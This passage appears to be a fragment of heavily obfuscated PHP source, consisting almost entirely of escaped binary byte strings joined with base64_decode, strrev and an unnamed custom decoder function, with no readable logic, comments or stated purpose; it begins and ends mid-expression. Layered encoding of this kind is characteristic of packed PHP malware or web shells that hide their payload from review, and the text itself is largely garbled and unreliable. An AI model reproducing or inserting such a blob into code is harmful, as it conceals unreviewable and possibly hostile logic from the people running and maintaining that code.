X£ÃÈ'."\0".'—ö*iv√Z®À').strrev('í<85Øf-R]†∆|ÑÕf∫ÑjôÖZBÙ‘d"åJﬁc≠ñ™≥7ÔmgLYü´')."\2\74\231\71\35\320\163\60\233\266\6\122\160\170\73\155\172\43\103\132\230\354\131\0\230\62\225\217\2\214\343\240\276\302\314\347\200\241\67\6\324\154\52\17\145\67\116".base64_decode('hYGaOQ362l9esTLNtBRTWdmlkVwhtQI6MjQ4ahQY2tiZkpodglmfPRVqnDENujU=')."\260\302\316\130\114\71\71\150\225\126\14\367\303\10\224\65\63\233\146\372\213\354\210\121\56\15\257\144\75\142\313\145\264\154\146\207\140\54\107\207\162\171\275\10\170\143\17".base64_decode('apnRFEzczJkwQHpuJL2ywE6k+nOpUhqKtIdzhj6aZUgErSyaK/uzOVbKLBiBweE=')."\x7c\x51\xcb\xb0\x19\x2c\x66\xcb\xc6\x8\x8c\x79\xc9\x48\x67\x50\x93\x80\x46\xc\xa1\xd5\x9d\x86\xb5\x39\xad\x61\x16\x1b\x73\xf8\xb0\x74\xbb\x7f\x68\xa0\xc8\xc6\x71\x16\x9b\xee\x46\x86\xf8"."\x7a\x6a\xc5\x30\x34\x68\x2a\xc3\xbc\x62\x36\x55\x28\xe9\x30\x51\x8d\xb3\x19\x1a\x72\xac\xb7\x87\xd3\x65\x76\xa7\x66\x6a\x23\xf4\xc2\xd0\x33\xe9\xd4\x30\xa3\x0\x30\xf7\x53\xa6\xcf\x64\x53".strrev('æ'."\n".'6∑‡%r…vò…>ô¶¢⁄ÊóŒ∞˝['."\r".'´ËvJ–∆£√Mî»<ÿê±Jf¬')."\274\132\340\206\33\235\60\150\151\331\120\130\116\60\250\151\314\100\225\31\276\12\313\0\253\104\114\347\1\216\44\174\241\130\315\244\204\10\213\65\2\222\75\1\16\306\345"."\x9c\xe9\x82\x2d\x45\xa3\x90\x23\x36\x6e\x1b\x26\xb7\x60\xa0\xb6\x51\x3e\xdc\x2a\x9f\xb3\x9f\xd\xb0\x8\xaa\x1c\x9e\x81\xa2\xd2\xb2\x86\xd\x13\x86\x63\xd0\xc8\xa4\x73\x46\x29\xe3\x28\x35"."\223\162\224\311\241\114\162\167\307\364\217\1\107\345\70\354\76\31\314\61\100\51\62\143\111\71\340\143\103\234\222\146\223\152\170\155\325\32\364\311\140\257\34\253\27\120\53".base64_decode('cjmf80JckvyBMaCXrixtqKQVxHmqNSgNPL7J1tOdTATiCyUDMnzTiqFQUpgAS90=').base64_decode('EiVI4yjPoHMI2NHG7k337jj/kp0X37Jz3c077rlw98237Nh6MQpu33Lejpsvf2c=').base64_decode('/enbt6zbvuWk3Wfe/uF95+44f9PuU7fu2HD9jmvO3H7v1t0PnLnr+nO2b9m4c8M=')."\332\35\247\337\271\375\336\113\166\234\165\305\216\63\317\337\171\341\272\355\133\67\240\364\73\317\22\45\243\144\73\66\376\22\347\275\357\224\35\133\266\354\276\362\172\36\373"."\xe1\x7d\x27\xd3\xc6\xac\x84\x45\xde\xa1\xd9\xf8\x82\x1a\xb3\xa\x22\xa3\xa3\xcc\x53\x0\x21\x35\xcb\xa7\x74\xe7\x34\x34\xc2\xa\xb9\x7c\x85\x4d\x88\xec\xac\x66\x2a\x36\x31\x25\x52\xd1\xdf".base64_decode('glHwUoSjl/8sRS/gaIXNjY8jZULLFzFqwSj56T0bhzGxhH/VhplGVEErPNZiruo=')."\360\47\34\20\141\5\230\322\257\42\100\246\111\351\107\331\24\146\176\257\330\6\373\316\217\362\111\167\55\202\252\323\312\233\301\246\166\200\153\235\205\12\24\32\46\31\221".base64_decode('03OFCpQiq8pJEhzrzUlM5CjnSICOkpx6exTaFI9CDjkV52UxfIrNToblNSY339Q=')."\x8a\x39\x35\xcd\x9b\x5e\x1c\xad\x3a\x88\x72\x6b\xe4\x13\x56\x57\xd7\xe2\x55\x86\x91\x77\xce\x11\x89\xd6\x75\xc9\xae\x92\x50\x1e\x6d\xc7\x89\xa3\xd1\x9a\x43\x84\x4e\x9c\xb3\x91\x73\x68\xd1"."\xd\x1a\x14\xba\x58\x54\x11\xa7\x93\xa6\x96\xd1\x99\xe9\xab\x96\x27\x29\x99\x1d\x39\xd1\x0\x73\x9b\xdb\x34\x5a\x2\xa6\xe3\x20\x67\xee\xfc\x62\xb6\x88\xef\x12\xdb\x73\xe6\xc3\x5d\x40\x38".strrev('q∑Ç«öºA`â™q8†øÇ~~9©ïÎ◊ìY8Ω§Z⁄`æ!√ÓsC Û∏∑¬ıJJ†')."\253\0\264\314\7\6\64\313\156\42\27\200\224\311\12\152\350\54\337\24\364\101\26\304\164\337\114\364\111\106\11\26\161\157\101\152\24\375\234\123\262\230\325\176\251\220\143"."\120\364\211\222\304\112\5\74\157\115\316\236\150\205\214\224\151\216\232\266\233\245\336\60\106\314\47\172\251\116\26\361\132\346\50\30\156\251\357\303\220\200\345\355\162\316\46"."\352\225\227\117\60\232\64\264\361\147\54\142\0\11\373\10\24\151\111\67\24\143\2\67\160\166\62\10\137\223\325\226\47\262\210\230\213\2\267\174\264\162\52\73\124\263\20".strrev('ËŸæV›}…b…|âäŸ%®p“C£2c·'."\r".'ù≥_¥I√6≈"ƒ◊6K%Ué4°«').base64_decode('JePxqHT5lly3WpJcGG1LtkajC0OAajANTRI1xJd7xCEsDolLPvgUQjZ5ktkNfPU=')."\30\157\251\161\5\14\2\21\116\267\166\6\142\334\356\172\272\257\301\67\105\244\105\25\46\261\371\171\63\273\121\30\117\4\142\125\56\240\323\213\351\60\105\160\31\35\62".base64_decode('dEYXK63RcE9XJE7vXVN4JCrFE+taiGbX0yujofhgdzjQGlRCkUSUmc9ze0dycSI=')."\316\303\154\10\114\113\343\327\317\41\77\15\310\227\73\344\22\171\111\200\324\313\74\265\275\65\275\223\172\353\172\353\227\373\172\255\76\277\264\77\351\362\364\100\240\273\15".strrev('y⁄'."\n".'á]¨wõ´ı€Œ{ˆÎt]v?D5¥g√à“öÃ5†X—@kÉè«äÎ\\L2øƒ◊∫')."\351\51\73\177\161\47\142\107\60\13\162\363\271\273\356\77\157\347\105\233\166\236\13\254\203\262\173\323\135\333\267\76\260\353\242\353\167\334\374\313\235\227\334\275\353\322\323".strrev('«n∞‹ÏÁÁi>ÆJf3z⁄Ì◊”ù˚î#rÑ∂r◊yÁº.wî√yÎÏ„∫‹7;ƒh')."\331\127\356\130\177\375\256\363\66\355\270\352\324\35\147\254\333\275\351\342\243\334\210\104\303\313\330\124\300\241\274\377\204\136\153\122\35\35\336\136\153\62\36\332\172\364\133".strrev('/Û'."\r".'X≠òÌR∫‰ìÖü˜pZA¿f°Q\'˜w9Ì˜A≠#ı«ßv&*3/—Ò≠á')."\65\112\152\114\133\60\336\32\13\265\4\301\336\233\117\324\104\302\103\301\331\76\202\306\143\213\370\67\277\311\125\341\153\101\251\143\310\134\257\70\72\242\372\322\106\256\224"."\x2f\x90\xc6\x2a\x35\xd8\x5c\xa8\xc6\x83\xf7\x19\x72\xd5\x46\xa9\xc1\xfb\x24\x2\x68\x69\xb4\xf4\xea\xf0\x3d\x67\x62\x4f\x5a\xbb\xb4\xd6\xd3\xe0\x99\x52\xaf\x80\x23\x6\x9a\x3\xdc\x2f\x28".base64_decode('NWB2zPM5KvGkHKEpnoZ6paY4WAPtEuOKWp+kKS1F9dRBg+XmirSImlm2qeqIvCk=').strrev('$ë*˙+íΩmsO+„£Ì/ƒƒµ›ORS9¥àòn°<Ë9Ì!R·◊Ë¸Òi').base64_decode('m2Mwmh2DUTcZ6ER3B59vaiKv0BtUtFmqxSYKoGSqMJTOFktroG6gyaHp0QePwcY=')."\344\274\44\104\216\170\4\233\101\14\347\223\130\45\216\270\310\250\241\174\36\355\147\336\32\140\244\16\134\36\164\55\345\175\140\270\254\60\206\203\73\330\300\167\301\202\211"._kodDe('KUPL2n/+ZijCfp45A7gKLZ55RQAAg4UMIwVBiLuWaXA9yynkOro1MFBSeBT2ZgV/')."\11\64\75\346\246\224\146\245\26\123\76\12\252\165\14\77\251\210\15\131\202\324\212\326\125\322\106\254\21\35\205\342\0\64\6\146\137\41\27\140\125\222\245\271\226\336\65"."\x67\x1e\x32\x98\x27\x98\x68\x2c\x91\x44\x3\x0\xe4\x59\xa2\xba\xb5\xd2\x6e\x21\x19\x1d\xe3\xab\x3c\x65\xc6\xe5\xf7\x23\xae\xc8\x60\xd7\xe6\x33\x29\xe6\x30\x6\x15\x8e\xcb\x6c\x8d\x46\xda"."\103\354\272\127\33\310\320\305\214\341\110\324\26\13\341\313\314\120\277\302\212\222\56\331\241\200\260\44\100\201\342\160\206\177\213\133\275\70\202\357\371\50\40\266\174\24\340"."\233\15\116\45\171\266\301\365\307\43\374\133\260\263\50\200\255\332\4\365\135\334\306\277\73\371\45\115\34\21\215\111\201\100\54\320\25\347\301\330\142\176\213\200\303\350\155".base64_decode('gmSkp0tQ/HBgEUKWqGBQGLWu802aX99Lb2TRT/qzgIXwLZW+VVM8yow19ZCG3WE=')."\x4a\xda\x59\xbd\xc0\x38\x4f\x5c\xcb\x71\xe1\x64\x38\xda\x41\xc3\xc4\xe3\x4e\xb0\x90\x11\x12\x87\xb2\x4c\x41\x6c\x70\x42\xb0\xc1\x16\xdb\xba\xf8\x6a\x50\x10\xe\x2b\xf4\x9a\xa7\x12\x89\x2e"."\xe\x8\x27\x2e\x52\x4\x40\x84\x4f\x17\xff\x9\xcb\x7a\x87\x7b\x7d\x88\x59\xb0\x96\x8b\x1b\x56\x6d\x2d\xa\x63\x43\x5a\x89\xc4\x4e\x5\x7b\xc8\x1d\x60\xdb\xe8\x72\xf\xec\x18\xc9\x9c\x31"."\xc0\xfc\x24\x20\x82\xc8\xd8\x5\xfa\xbb\x84\x7d\x10\x5a\x9\x19\x90\x18\x5b\xcc\xb1\xab\x56\xf4\x8e\x57\xb2\x77\x75\xef\x31\xbd\x5e\x1f\xbd\xd6\x86\x99\x97\x5e\x8f\x68\x52\x32\xb8\x4\xed".base64_decode('sfG4405ekrj7gNJRL+GLrloamAs/IF/NBfYUgvOa+WQGj1sdQX87EquD6G8Y/YQ=')._kodDe('LlgDZKrwjrkdWGBgUe4lNDfjxJRxSYcJjIEy2MU0T0ZQEney3nJKtXkQsbA90a5H')."\44\105\4\7\272\52\171\144\302\346\347\20\55\314\321\241\350\144\262\216\14\246\267\157\162\175\62\351\267\172\0\137\370\165\367\272\332\11\123\152\141\17\11\304\133\5\365"."\165\40\104\45\56\20\143\161\47\42\160\77\103\20\356\210\105\173\272\245\160\147\140\121\50\322\301\102\376\111\354\153\22\24\255\264\205\342\150\210\132\31\62\12\367\107\162"."\x18\x18\x4e\xc2\x16\xc9\x5c\xaf\x3\xa5\xdb\x10\x65\x47\x1\x89\x65\xc7\xc2\x0\xa5\xcc\xce\x55\xd6\xd2\x13\xa\xb7\xc9\xd7\x90\x71\x42\xd8\x50\x8\x55\x87\x3d\x65\x22\x6b\x1c\xb\x93\xb"."\xc9\x2c\x80\x87\x9c\x7d\x13\x74\x63\x1\x32\x6\x2c\x40\x7\x80\x85\xc8\x70\xb1\x0\x71\xb3\xc4\x2\xa4\xa3\x2c\x80\xa5\x93\x60\x84\xc5\x21\x89\x11\x49\x7b\x4c\xc\xcc\xaa\x65\x7e\x8f\x6e"."\x4e\x26\x25\x5d\x76\xc7\x34\xd8\x47\x75\x61\xd8\x23\x2\x92\xe2\x54\xae\xb1\x74\xa9\x3b\x89\xe6\x49\x12\xee\xa9\xd5\x99\x22\x5d\xe7\xf5\x53\x10\xe2\x36\x9\x10\xfd\xf6\x2e\x9f\x4f\xb8\xe1"."\xe5\xc\x31\xe9\x9d\x51\x3b\xa1\xdb\x39\x47\x2d\x70\xb7\xc\xd5\x12\x22\x17\xfa\xa4\x7a\x98\xa5\x3e\xd1\xf3\x25\xd\x49\xd7\x4c\x36\x6a\x19\x20\x34\x4b\x54\x31\xd\x4a\x5c\xa1\xa0\xc1\xd6"."\166\104\275\113\203\116\21\212\323\245\345\134\62\2\37\120\36\370\205\26\175\207\376\364\102\220\51\46\340\22\106\255\7\66\131\146\261\357\224\216\173\173\153\306\32\55\110"."\300\306\14\202\65\64\310\162\351\174\317\113\147\261\323\204\244\235\147\212\155\42\234\11\25\62\125\103\213\160\133\54\332\115\71\20\45\324\256\320\233\371\112\55\125\134\327"."\2\153\325\32\13\342\325\101\123\261\270\272\132\207\312\151\136\255\2\327\164\353\235\271\102\221\266\340\22\245\126\317\214\44\125\65\11\231\25\264\26\131\101\112\105\111\254"."\x4\xda\x56\x38\x98\xb1\xb2\xc6\xb0\x22\xa3\x17\x93\x97\x5b\x29\x2c\x21\x50\xae\x82\x35\x23\x77\xec\xd9\x95\x48\xf\x8\xe5\x3c\x86\x72\xc4\x34\x2a\x14\x47\x1b\x76\x38\x4c\x7a\x8a\xa2\x74"."\13\63\262\36\205\137\205\307\100\54\174\120\125\46\24\304\42\150\101\64\52\270\44\21\13\140\40\341\76\367\33\217\376\20\202\202\245\43\63\117\374\64\44\51\317\346\133"._kodDe('Lzn91HEF/SGAh37zOBH7jUoWwzIN9COHYyxUMbGpz5dYBSr52YWzf7EI+EXvgI9i')."\334\26\25\1\335\352\221\356\53\107\120\253\345\373\313\164\216\71\205\105\362\54\243\260\250\65\260\0\360\314\3\303\103\275\342\45\371\165\124\246\104\251\143\267\74\75\354"."\203\271\5\40\367\152\230\336\52\217\110\16\17\211\131\3\334\207\131\221\143\345\13\102\302\155\37\336\44\361\44\63\152\337\36\350\11\313\20\30\52\145\141\160\351\327\254".strrev('Ê¶ ±Ìhâ=≠Ïh-Ô∏•Ç•§…Æ†©Í?–È∫ü–m_u1≈Ñkj“÷').strrev('{'."\r".'nÉÜ∞•–<P—ÆÊ¡"ÑtåÛ\\¸ÒÆµM,k¶ø>‡\'(û[π%{R¨>#–').base64_decode('5ZoF5YSiyTDiiZOy+iwUBUWuLyW7qUgKbxc+VVgg22ZJ8vhGrJHR/AfEpXauWyY=')."\x71\xa5\x14\x4e\x2c\xed\x1a\xba\xd1\x84\xf\xe\x30\x94\x72\x1f\x73\x18\xb6\x14\xd9\x75\x67\xf0\x84\xe7\x36\x15\x96\xc1\xc2\xda\x98\x9f\x74\x30\x23\x67\x44\xae\xf2\x8e\xc\x3d\xd2\xed\x73"."\65\43\231\26\53\254\146\162\4\123\160\172\155\103\33\142\56\211\35\101\40\171\57\251\211\366\347\65\313\342\7\261\104\272\141\237\166\126\334\302\227\275\322\265\265\260\261"._kodDe('LAccqt71iHbFBqjFo+kI6pNLsu+EKygCxz/V+A8krDs00BMbY/KHd3gsDZJuvBLe').base64_decode('YzK66ORKveg+QSgY3ZqZ18lJyWJxOYTHS7nJbRvj6wa3VEA1dPOZ9U5hiZlDVII=')."\60\12\27\120\371\215\7\64\245\44\257\144\22\117\230\44\50\326\204\63\313\243\134\215\263\15\243\113\55\214\46\214\105\272\6\150\332\26\135\34\11\107\231\67\56\346\172"."\x8f\x86\x6\xc0\x14\x3\x71\x24\xa6\x8f\x5\x6c\xf6\x61\xaa\x50\xf3\x62\xc6\xb6\x63\x6e\x42\xf2\x23\x7b\x94\x8c\x3\x64\x32\x5\x4e\x6\x62\xad\x9d\x48\x4\x4f\xb6\x87\xd0\x1e\x82\x36\x28"."\x51\x40\x27\xca\x8a\xa4\x7b\x69\x9a\x24\x68\x17\xf3\x5d\x83\xf8\x47\xbc\x89\x86\x8d\x1\xbe\x78\x11\x8b\x6\xae\x99\x1c\xb\x38\x14\x85\xbc\x3e\xd\x5f\x6e\xa1\x17\xc\xf0\x5\x24\x9e\x91"."\x7a\x27\xfa\xe6\x4c\x3d\x92\xd7\xc2\x31\xd6\x66\xd5\x7c\xad\x90\x90\x57\x68\x12\x7d\xca\x37\x57\x18\xd3\xc4\xb6\x88\xb2\x91\xbb\x44\xdf\x98\x49\x38\xce\x24\x35\x91\x4c\x12\xdd\x72\xe5\x21"."\x8\x44\x6f\x42\xc0\x5c\x67\x21\x5a\x38\x9b\x41\xc4\x32\x12\x4d\x76\x22\x7a\x1c\x65\xbb\xb6\x6e\x25\x1c\xf4\x8f\xe5\x82\xd5\x6a\x23\xa6\x22\xed\x27\x77\x2a\x41\x26\x9a\x43\x8e\xc8\xe9\x41".base64_decode('HchZqxAJ5F/MNAFcIYndMkB/luYzXtRwMHTIaDZ3QYNXWUBykCPdSM1zAjUsOYM=').strrev('nEÅÌ°¿≤~RÎ`±âÀìqÿƒˆèR|yìŒCüqŒ ï–"4ƒ:æÀS')."\x5e\x3\x89\x40\x47\x55\x30\x57\xe\x61\x38\x91\xc2\x92\xb1\x28\xd6\xa2\x5\xc3\xed\xae\xc\xf1\x4e\xee\x97\xcf\x9\x4b\x86\x43\x91\x85\x55\x23\xd0\x5e\xde\x25\x65\xa1\xc0\x50\x22\xd8\xe5"."\206\71\113\210\7\361\372\25\341\226\160\264\125\212\16\105\53\107\202\63\13\34\110\165\160\24\350\77\241\256\167\25\21\43\232\220\64\221\131\215\205\165\157\22\311\372\363"."\173\327\324\327\365\372\347\373\46\161\35\23\245\47\322\65\306\61\300\26\243\373\115\156\0\336\62\30\220\146\203\220\337\347\203\112\370\207\277\327\317\375\36\61\62\12\316".strrev('©-6)9nﬂ—â]˘œì&ã;≈´⁄>q•ÒìèD0;Ìœ≥≤Ïè.£åC‘„M').strrev('àÏ€@Yµ≥ãö¬Â!AÎë(Á»fÿ∏åFÑÏ%“1õEà-bß»2†Àé†Å–ö').base64_decode('rYhp6+gMHbsw3BWJdh8Xiyd6Fi1esvR4GF2GAv2Kl/mQAq+E/rJq+svMk+0izHM=')."\x6b\x96\x5f\xe6\x79\x38\x10\xf5\x11\x91\x3b\x46\xac\xfc\x54\x14\xe7\xb1\x98\x36\xf8\xab\x47\xd1\xd2\xfc\xf9\x82\x3d\x65\x8c\x14\xdd\xa6\x96\x32\xc\x7b\x8c\xd8\x45\x5d\x5f\x5f\x30\x44\x2e".base64_decode('67X6GM75M1rZL7gVRsK4pAH7tVf2qIvRU2a8MinX5gsA4R1a2qIFsJEZ0S315r0=')."\231\336\104\7\166\55\330\173\74\237\153\335\224\134\374\245\215\102\106\227\156\247\253\151\306\143\225\322\203\374\362\67\246\376\226\167\130\147\330\64\201\213\137\140\113\224\124"."\323\124\34\225\354\350\206\274\130\32\361\252\271\1\3\361\133\331\74\203\252\203\216\170\341\125\262\150\344\164\346\365\153\310\213\252\220\342\150\142\124\70\333\103\261\65\1"."\xf7\xc8\x89\x3\x16\xf\xc9\x4b\x8c\xec\x32\xdc\xe4\x5\xef\x65\x9d\xae\x15\xcd\x81\xdc\x5f\x68\x9c\x74\xa2\x49\x99\x6\xe\x72\xdb\x11\xe3\x2b\x5d\xe\x64\x6e\x4d\x85\xdc\x88\x59\x27\xe2"."\x13\x96\x6\x3d\x8a\xf0\x8d\xcd\xd4\x95\xd5\xf9\x3a\xac\x68\x92\x6e\x3b\xa6\xe5\xcb\xea\x8c\x18\xe7\x7\x85\x71\x55\x7e\x90\x1b\x4c\xa4\x1d\xcc\x9\xe6\x3\xda\x25\x1b\x2c\xc1\x7f\x80\x57"."\152\24\327\62\312\14\231\340\242\142\313\150\114\172\15\300\341\101\100\166\354\35\130\34\237\346\355\354\12\264\172\321\226\322\310\214\347\321\306\336\233\100\73\73\103\54\165".base64_decode('2JrG5A0KmTxDyaKZAIyp9L45wel1lgKpV8m0qWWwWQnjJCnUhUkUKOgEDVNvZcw=')."\360\52\253\362\6\343\156\0\255\252\122\357\222\252\365\56\251\126\357\22\127\275\113\52\353\245\40\27\306\252\305\142\153\26\343\202\203\232\72\100\151\71\300\166\262\176\154".base64_decode('NiMb34Bmk1rU+lB0G2WqMzy9Jb74quiX1oujOB+Q/AzbOC1GxHKqZS9yOLX5Rh8=')."\261\330\363\102\27\27\203\70\357\352\67\54\313\217\35\345\21\216\235\233\216\105\343\354\354\306\331\47\152\351\43\111\335\340\272\213\73\60\345\356\115\205\17\124\252\162\247".base64_decode('30HujAQJHoEB7FAC0TkYleBI0bA02fluRiOOG/nNbclTbV4dwZSIWdRJPmuZB1g=')."\xd9\x6b\x1e\x1e\x30\x6f\xde\xe1\x4f\x7b\xc4\x8b\xba\xee\xf2\xfa\x6a\x69\xda\x20\x13\x30\x25\x21\x84\x2b\x5\xba\xb9\x37\x57\x77\x77\x30\x29\x10\x44\xd1\xe4\x9e\x7e\xe9\x69\xad\xb7\x2a\xc0"."\53\371\102\240\324\100\362\374\214\332\5\105\343\146\302\372\315\222\261\141\212\4\372\163\174\265\136\173\115\341\136\27\315\45\365\301\276\120\33\145\256\153\135\53\300\345\355"."\266\267\243\267\253\67\41\17\223\155\252\375\375\250\331\222\37\115\107\133\204\163\135\100\77\374\122\202\60\74\35\323\65\57\34\112\34\123\325\263\57\104\22\251\303\157\22"."\x83\x35\xcf\x70\x92\x63\x2e\x79\x6c\xa1\xa\xee\x1e\x87\xe1\x80\xbd\xfd\xc2\xca\xad\x58\x92\xde\x25\x91\xf1\x5\x6f\xe3\xdc\x90\xd\x2b\x15\xa8\x43\x64\x46\x32\x88\xa3\x62\x70\x7a\xde\xcc"."\172\204\206\256\320\142\144\140\117\134\125\203\60\261\246\251\146\102\35\372\255\257\361\324\140\346\224\204\361\54\142\0\151\107\115\323\204\72\362\121\17\256\101\126\302\105\5"."\xc9\x65\xa8\x38\x9\x7\x75\xc2\x7c\x34\xb4\xd2\xf1\xcd\x7c\x32\x1a\x78\xed\x37\xfa\x1b\xfd\xc3\x40\xf\xe6\xf\xe1\x1a\xc5\x4b\x3\xee\x3d\x60\x24\x89\xc8\x1e\x3b\x96\x48\xca\xc4\x17\xc8".strrev('™Œ˜hì€\\—M=ÖZÜæ)⁄ÊÕ$9ÚGÛπﬂÖ{«]EFt€Wr»¬[…”∫å:')."\235\77\157\277\271\255\344\60\327\326\272\360\151\54\366\214\114\25\0\363\340\260\145\56\136\136\74\340\167\206\306\312\13\370\227\127\127\32\5\264\325\41\12\225\367\245\141"."\x30\x7b\x38\x15\x13\x7e\x95\xb\x9a\x3d\x6c\x98\x70\x52\xd\x4\xb6\xb1\x61\x9a\x8c\xd3\x80\x22\x16\x5b\xda\xc4\x1b\x41\x13\xd6\x4f\xb2\xee\xf7\x14\x47\x4b\x5\x2f\x56\x43\x78\xe3\xb2\x5f"."\x38\x97\xbb\xf6\x6\x67\x7a\xac\x48\x70\xa6\x97\x49\x63\x5a\x90\x8f\xbc\xf8\xa4\xae\xf7\x9b\x14\xf9\x8d\x5\xc9\x6b\xad\x17\xf3\x4\x74\x55\x32\x9d\x16\xc0\x30\xd5\x64\x20\xdd\x69\xf8\x29".base64_decode('SGLSSRIXuNqLh9qLmC6M/2hRoe3X1qolcTr9dz8F4B4FkgVPrld+Y2AEcdw4Gns=')."\40\367\342\371\365\352\231\261\142\304\242\256\332\324\64\240\112\265\44\75\45\75\343\256\222\30\7\170\113\45\126\141\325\102\145\171\200\45\40\235\10\361\362\34\234\271\212"."\346\232\63\343\156\346\136\322\33\127\72\367\106\213\127\151\234\332\64\175\166\23\273\364\166\14\263\155\50\25\231\365\62\372\144\316\277\217\362\367\63\72\40\136\1\140\175".strrev('Üÿ∆)(U¯˜rI¯∂WM¡DÓw%Ÿï(Ë	}„≠hù#àŒÚ0≈ÄwIπ.√')."\xdb\xae\xf4\xc4\xe\x9f\x90\x1\xf6\x61\xf2\xf4\xaa\x58\x22\xa9\xdc\xa0\xe8\x49\xa\x1b\x6a\x3\x86\xf\xa2\x86\x1a\x82\xcd\x22\x5b\xae\xa4\x4d\x4e\x67\x4b\x85\xc1\x66\x29\x52\xb1\xd\x43".strrev('±RoÖ.¸>˘’C/ßQ‡<">ÒO>ÊΩ'."\0".''."\n".'˝iæâÊ¢∏9≠MZ&êQÖ´…')."\244\352\316\225\370\273\3\105\362\15\55\354\16\367\164\204\42\222\141\222\4\110\266\266\105\222\201\356\356\252\21\234\141\301\112\102\174\252\357\133\301\336\310\111\63\254\232"."\253\347\7\224\64\276\275\320\134\203\241\65\212\145\246\231\347\327\32\77\320\121\222\100\310\117\163\165\310\122\213\263\50\375\10\115\274\344\213\106\327\316\233\353\327\347\361".base64_decode('wRYudkxDXM7w+Y/G0pQfm/4UjsGzK1siEGi7cKijKHNVhY5jcy22y+ivVbJoP+Y=').strrev('Ë£ñó‹.2®∞µVÄù‰—?$@û´Í+ôTBÂ˝åä Ò#ï_Æh|Ï#ô‹Ûèv')."\x4c\x92\xeb\x23\x95\xe9\xfd\x44\x13\xe0\x17\xf2\xa2\xf3\x48\x86\x9f\x62\x54\x41\xa\x1f\x7f\x6d\xa7\xa8\xa6\x7\x31\x46\x9\xf2\xf\x75\x42\x44\x37\x16\x51\x68\x84\xc3\xff\xbd\x2d\x99\x5e"."\224\360\125\52\242\150\67\305\353\35\253\126\321\202\360\216\277\146\115\45\14\254\67\335\121\201\242\356\6\141\314\161\303\260\310\55\140\150\37\163\126\103\261\126\116\44\40"."\x2c\xd\xfd\x15\x79\xc2\x91\xe\x11\xa0\x22\x89\x23\x72\x19\x33\x94\x26\xa1\xde\x65\xb5\xbe\x49\x6b\xd6\xf8\x75\x66\xe3\xc4\xec\x31\x58\x5e\x1f\x4f\x4d\xc3\xbd\x3e\x67\x7a\xd4\x13\x18\x7a".strrev('∂ò±7¨ ˇMã2üP&1≈èß\\¸eºÛsSÅ∞Re∑˙‚I˛~ﬂ<îîÓ'."\0".'û')."\x46\x4\x9b\xcb\x91\x9c\xd2\x13\x1f\x51\x97\x4\x9c\xae\x65\xe7\x97\xf9\xbb\x13\x74\x54\xe5\xef\x40\xb1\x28\x7\xd9\x63\x2b\xe4\x8c\x21\xa7\xa7\xfc\x7c\xb5\xd3\x73\x7\x5f\x5a\xdc\x9a\x62"."\x49\x8\xad\x71\xc1\xb1\x21\x92\x2b\x2\x3f\xbf\x46\xc0\x65\x44\xc\x11\xd7\xb5\xc2\xd\x47\x65\x71\x20\xff\x98\x6b\xa5\x4d\xbd\x68\x3b\xe8\x14\x7d\xbf\xae\x86\xbc\xb\xb2\x42\x2d\xab\x34"."\111\215\2\362\171\163\15\161\217\136\203\350\22\215\1\202\40\232\62\27\23\40\305\324\162\315\65\244\271\126\126\323\120\176\102\142\252\125\202\62\326\50\214\72\346\125\76".strrev('Zt/◊“rPõé‘ôß*y'."\n".'!ö8N˛Å>é©`sÅ!≈pbzyÅﬂﬂèç†m¶b').base64_decode('8EBQdyyaiLayN1aqKb+mMf7VohfOhJzDbuNwcweWgnMEfoDA9JulQoFbjmEWkW8=')."\x5b\x44\x1e\xd6\x32\xb0\x6\xe8\xa9\x59\x3c\x5b\xb2\xc5\xf6\x87\x7d\xa9\x27\xf0\x4d\x5a\xb\xc0\x92\xf3\x3b\xec\x7a\xf\x65\x5e\x46\xf5\x90\xcd\xd\xec\x42\x5\x33\x36\x13\xf7\xaf\x58\x4a"."\162\366\111\250\162\141\240\317\21\125\245\170\252\376\115\160\73\57\255\340\320\174\320\146\345\14\166\325\276\261\241\241\301\333\60\5\375\317\17\202\201\123\153\142\156\21\244"."\44\15\15\115\344\177\32\101\224\267\60\27\316\30\264\364\31\315\202\4\303\232\6\15\202\15\41\257\27\112\214\231\132\326\212\257\134\51\270\151\175\214\177\140\355\107\323"."\x40\x3c\xf8\x31\xf2\x31\x47\x12\x1\xe7\x28\xe4\xa0\x11\x42\x9a\x7b\x10\xf8\x9\x2e\x4c\x2c\xdb\x87\x31\xbd\x60\xdf\x88\xa7\x41\xa3\x4a\x6\x5\xda\xcb\x6f\xe9\xa1\x64\x2\x7d\xe6\xd0\x4b"."\x91\xcd\xbc\x51\xc1\x42\x66\x99\x5c\x99\x8f\xd\x2e\x5\xa\x9f\xc2\x5e\x16\xe1\x95\x7d\xf4\x43\x26\xba\x31\x88\xe3\xb\x47\xd3\x50\x1e\xa7\x6b\x40\xc\x41\x1b\x74\x9a\xf7\x13\x3\x24\x4d"."\x9\x66\xd0\x24\x77\x87\x38\x28\x9f\x52\x90\x68\x7e\x29\x8e\x84\x72\xfc\xd6\x3d\xe\x46\x78\x49\xf4\x29\x8\xfa\xe6\x23\x8c\x61\x15\x4c\xce\x1a\xc3\x49\xb1\x7\xe3\xe0\xb1\x3c\x44\x86\x14"."\213\112\14\15\63\322\305\105\74\256\214\32\63\264\143\366\7\140\316\100\56\242\17\352\71\307\365\333\244\124\266\74\232\163\160\102\171\224\320\132\15\360\67\57\250\261\40".base64_decode('q16BhQf8Ad4iyJtk1L6zab+K+bPdc0emwTTE5dmKdyVZSJoMpgyPf4O1DYMEGYA=')."\332\247\264\162\147\200\122\1\356\50\127\236\100\106\172\371\320\22\136\0\133\271\13\122\331\65\40\75\317\227\254\76\54\360\163\56\16\360\131\31\145\111\276\361\25\115\143"."\x0\xcd\x8e\x25\xf7\x15\xc1\xbb\xab\x83\x79\xf2\xca\x94\x55\x12\xf1\xe\xc9\xe9\x64\x20\x3e\x8b\x60\xf\xfa\x1\xa2\x89\x7b\xb7\xaa\x78\x10\x54\x4a\x2a\x9e\x4c\x95\x80\xce\x75\x26\x45\xb4"."\xf2\x17\x65\x64\x20\x96\x97\x64\x93\xd\x62\xec\xea\x2c\x3\xb\x62\x4e\x8\x6f\xd9\xd7\xe0\xa\x13\xa0\x6d\x78\xd0\x51\x36\xf5\xa3\xc9\x4\xad\xc0\xca\xd\x59\x5\xab\x1b\xcc\x1a\x4\x8f"."\x86\x38\x99\x75\xc2\x29\x8c\x8a\xb3\x8e\xc3\x9c\x4\x21\x37\x39\x8d\xbd\x25\x9\x4\x89\xe0\x3d\x2e\x80\x58\xcd\xb8\x6\x50\xe0\x2a\xac\xae\xe6\x66\x39\x9b\x33\xee\xad\x33\x7e\xc6\x3e\x2e"."\144\251\360\20\162\155\234\254\246\306\303\227\224\65\15\170\321\165\362\347\16